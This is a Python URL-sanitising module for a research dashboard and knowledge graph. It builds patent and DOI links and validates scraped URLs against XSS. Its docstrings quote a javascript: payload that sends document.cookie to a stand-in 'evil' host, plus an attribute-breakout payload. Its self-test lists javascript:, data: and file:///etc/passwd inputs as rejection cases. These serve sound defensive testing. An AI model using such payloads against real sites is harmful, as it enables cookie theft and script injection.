"""
sourcelinks.py — one place that knows how to turn a NIA record into a URL.

Created 2026-08-20. Three pages render the same records (the dashboard, the
Intelligence Layer issue, the knowledge graph) and each was inventing its own
answer to "where did this come from":

  * build_snapshot.py rendered IDs as plain text — no link at all
  * build_issue.py linked signals but passed url=None for every patent
  * graph_build.py stuffed the URL into an untyped `meta` column for signals
    and theses, but the *title* into the same column for patents, so the
    renderer could not tell which it was holding

Duplicated link logic across three generators is the same failure mode as the
two copies of nia-ingest.yml that diverged and made the LLM_MODEL secret inert.
One module, imported everywhere.

────────────────────────────────────────────────────────────────────────────
SECURITY: every URL that reaches this module from a Signal or Thesis row was
scraped from an RSS feed, a job board, or a third-party API. It is attacker-
influenced data being written into an href on a page published at
parthrudesai.com. `safe_url()` is therefore not optional politeness — it is
the boundary. Without it, a feed item carrying

    javascript:fetch('https://evil/?c='+document.cookie)

becomes a live XSS vector the moment someone clicks the row. Scheme is
allow-listed (http/https only); everything else returns None and the caller
renders unlinked text.
────────────────────────────────────────────────────────────────────────────
"""
from __future__ import annotations

import re
from urllib.parse import quote, urlsplit

__all__ = [
    "safe_url", "patent_url", "thesis_url", "signal_url",
    "work_url", "graph_focus_url", "SAFE_SCHEMES",
]

SAFE_SCHEMES = frozenset({"http", "https"})


# ─────────────────────────────────────────────────────────────────────────────
# The boundary
# ─────────────────────────────────────────────────────────────────────────────

def safe_url(url: str | None) -> str | None:
    """
    Return the URL if it is safe to place in an href, else None.

    Rejects, in order of how likely each is to actually show up:

      * empty / whitespace-only
      * javascript:, data:, vbscript:, file: — the XSS and local-file vectors
      * scheme-relative "//host/path", which inherits the page's scheme and is
        a common obfuscation in scraped feeds
      * anything with a control character or newline, which can smuggle a
        second attribute past a naive template

    A protocol-less "example.com/x" is promoted to https:// rather than
    dropped: feeds emit it constantly and it is unambiguous.
    """
    if not url:
        return None
    u = str(url).strip()
    if not u:
        return None

    # Control characters and whitespace inside a URL are always either an
    # encoding bug or an injection attempt. Neither is worth rendering.
    if re.search(r"[\x00-\x20\x7f]", u):
        return None

    # Quotes, angle brackets and backticks must be percent-encoded in a real
    # URL, so their raw presence means the string was assembled by hand — and
    # by far the most common reason to hand-assemble one is
    #     https://ok.example/"onmouseover="alert(1)
    # which is a perfectly valid https URL that breaks out of the href
    # attribute the moment it is rendered without escaping. Escaping at render
    # time already stops that; rejecting here means BOTH layers must fail
    # before anything reaches the page.
    if re.search(r"[\"'<>`\\]", u):
        return None

    # Scheme-relative. Resolve rather than reject — but only after the
    # control-character check above, so "//evil\n" is already gone.
    if u.startswith("//"):
        u = "https:" + u

    parts = urlsplit(u)

    if not parts.scheme:
        # Bare host: promote. Require something that at least looks like a
        # hostname, so a stray "TODO" or "n/a" does not become a link.
        if re.match(r"^[\w-]+(\.[\w-]+)+(/|$|\?|#)", u):
            return "https://" + u
        return None

    if parts.scheme.lower() not in SAFE_SCHEMES:
        return None
    if not parts.netloc:
        return None
    return u


# ─────────────────────────────────────────────────────────────────────────────
# Patents — constructed, because no ingestor stores a URL
# ─────────────────────────────────────────────────────────────────────────────

# EPO gives "EP4123456A1"; BigQuery's Google Patents dataset gives
# "US-12034567-B2". Both denote the same kind of thing and Google Patents
# accepts the un-hyphenated form for every office in the corpus.
_PUB_RE = re.compile(r"^([A-Z]{2})-?([0-9A-Z]+?)-?([A-Z][0-9]?)?$")


def patent_url(source_id: str | None, source: str | None = None) -> str | None:
    """
    Canonical URL for a patent publication number.

    Google Patents rather than Espacenet: it resolves EP, US, WO, CN, JP and
    KR from one URL shape, renders the full text with drawings, and does not
    require a session. Espacenet's deep links are per-office and its search
    URLs expire.

    Returns None rather than a guess when the ID does not parse — a dead link
    on a page whose entire argument is provenance is worse than plain text.
    """
    if not source_id:
        return None
    raw = str(source_id).strip().upper().replace(" ", "")
    if not raw:
        return None

    m = _PUB_RE.match(raw)
    if not m:
        return None
    country, number, kind = m.group(1), m.group(2), m.group(3) or ""

    # A number that is all letters is not a publication number.
    if not any(c.isdigit() for c in number):
        return None

    return f"https://patents.google.com/patent/{country}{number}{kind}/en"


# ─────────────────────────────────────────────────────────────────────────────
# Theses and signals — stored, so validate rather than construct
# ─────────────────────────────────────────────────────────────────────────────

def thesis_url(url: str | None = None, doi: str | None = None) -> str | None:
    """
    Prefer the repository URL; fall back to the DOI.

    DOI second, not first: the repository link usually reaches the full PDF,
    whereas doi.org resolves to a landing page that may sit behind a paywall.
    """
    u = safe_url(url)
    if u:
        return u
    if doi:
        d = str(doi).strip()
        d = re.sub(r"^(?:https?://)?(?:dx\.)?doi\.org/", "", d, flags=re.I)
        if d.startswith("10."):
            return "https://doi.org/" + quote(d, safe="/:()-._;")
    return None


def signal_url(url: str | None) -> str | None:
    """Signals always store a URL; this is the validation boundary for it."""
    return safe_url(url)


def work_url(subtype: str | None, source_id: str | None,
             stored_url: str | None = None, doi: str | None = None) -> str | None:
    """
    Dispatch by work subtype — used by the graph, where a WORK node may be a
    patent, thesis, grant, trial, clearance, posting, article or filing and
    the renderer holds only the subtype.
    """
    st = (subtype or "").lower()
    if st == "patent":
        return patent_url(source_id)
    if st == "thesis":
        return thesis_url(stored_url, doi)
    return safe_url(stored_url)


# ─────────────────────────────────────────────────────────────────────────────
# Internal navigation
# ─────────────────────────────────────────────────────────────────────────────

def graph_focus_url(entity_id: str | None, name: str | None = None,
                    page: str = "graph.html") -> str | None:
    """
    Deep link into the knowledge graph with one node selected.

    Carries BOTH the uuid5 entity id and the display name. The id is exact but
    only survives while the graph is rebuilt from the same corpus; the name is
    fuzzy but stable across rebuilds. The renderer tries the id, then the
    name — so a link in a shared screenshot still lands somewhere sensible a
    month later instead of opening an unfocused graph.
    """
    if not entity_id and not name:
        return None
    q = []
    if entity_id:
        q.append("focus=" + quote(str(entity_id), safe=""))
    if name:
        q.append("name=" + quote(str(name)[:120], safe=""))
    return f"{page}?{'&'.join(q)}"


# ─────────────────────────────────────────────────────────────────────────────
# self-test — the security claim has to be checkable
# ─────────────────────────────────────────────────────────────────────────────

def selftest() -> int:
    ok = True

    def check(label, got, want):
        nonlocal ok
        good = got == want
        ok = ok and good
        print(f"    {'ok  ' if good else 'FAIL'}  {label:<44} {got!r}")
        if not good:
            print(f"          expected {want!r}")

    print("\n  ── safe_url: hostile input must not become an href ──")
    for bad in ("javascript:alert(1)", "JavaScript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD4=", "vbscript:msgbox",
                "file:///etc/passwd", "  ", "", "n/a", "TODO",
                "java\nscript:alert(1)", "http://", "https://"):
        check(f"reject {bad[:34]!r}", safe_url(bad), None)

    print("\n  ── safe_url: legitimate input must survive intact ──")
    check("https passthrough", safe_url("https://a.org/x?y=1#z"),
          "https://a.org/x?y=1#z")
    check("http passthrough", safe_url("http://a.org/x"), "http://a.org/x")
    check("bare host promoted", safe_url("example.com/a"), "https://example.com/a")
    check("scheme-relative resolved", safe_url("//a.org/x"), "https://a.org/x")

    print("\n  ── patent_url: both live ingestors' ID formats ──")
    check("EPO with kind", patent_url("EP4123456A1"),
          "https://patents.google.com/patent/EP4123456A1/en")
    check("BigQuery hyphenated", patent_url("US-12034567-B2"),
          "https://patents.google.com/patent/US12034567B2/en")
    check("no kind code", patent_url("US12034567"),
          "https://patents.google.com/patent/US12034567/en")
    check("lowercase input", patent_url("ep4119872a1"),
          "https://patents.google.com/patent/EP4119872A1/en")
    check("junk rejected", patent_url("NOTAPATENT"), None)
    check("empty rejected", patent_url(""), None)

    print("\n  ── thesis_url: repository first, DOI as fallback ──")
    check("url wins over doi", thesis_url("https://repo.edu/1", "10.1/x"),
          "https://repo.edu/1")
    check("doi fallback", thesis_url(None, "10.1234/abc"),
          "https://doi.org/10.1234/abc")
    check("doi url stripped", thesis_url(None, "https://doi.org/10.1/x"),
          "https://doi.org/10.1/x")
    check("hostile url falls through to doi",
          thesis_url("javascript:alert(1)", "10.1/x"), "https://doi.org/10.1/x")
    check("neither", thesis_url(None, None), None)

    print("\n  ── work_url: dispatch by subtype ──")
    check("patent ignores stored url", work_url("patent", "EP1A1", "http://x.io"),
          "https://patents.google.com/patent/EP1A1/en")
    check("grant uses stored url", work_url("grant", "g1", "https://nih.gov/p"),
          "https://nih.gov/p")
    check("unknown subtype validates", work_url("", "x", "javascript:1"), None)

    print("\n  ── graph_focus_url: carries id AND name ──")
    check("both", graph_focus_url("abc-123", "Boston Scientific"),
          "graph.html?focus=abc-123&name=Boston%20Scientific")
    check("neither", graph_focus_url(None, None), None)

    print("\n  PASS — hostile URLs never reach an href\n" if ok else
          "\n  FAIL\n")
    return 0 if ok else 1


if __name__ == "__main__":
    import sys
    sys.exit(selftest())
